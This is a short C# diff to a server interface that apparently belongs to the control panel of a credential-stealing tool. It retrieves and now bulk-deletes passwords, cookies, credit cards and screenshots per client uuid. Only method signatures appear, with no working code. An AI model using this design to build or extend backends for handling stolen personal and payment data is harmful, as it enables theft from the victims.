@@ -12,6 +12,11 @@ namespace X_ZIGZAG_SERVER_WEB_API.Interfaces
         public Task<List<CreditCardVM>> GetCreditCards(string uuid);
         public Task<List<PasswordVM>> GetPasswords(string uuid);
         public Task<ScreensVM>? GetScreenshots(string uuid);
+        public void DeleteAllScreenShots(string uuid);
+        public Task DeleteAllCookies(string uuid);
+        public Task DeleteAllCreditCards(string uuid);
+        public Task DeleteAllPasswords(string uuid);
+
         public FileResult? GetScreenshot(string uuid,int screenIndex,string screenshotFileName);
         public FileResult? GetScreenshotPreview(string uuid,int screenIndex,string screenshotFileName);
         public Task<UpdateClientSettingsVM> UpdateSetting(string uuid, SettingsRequestVM setting);
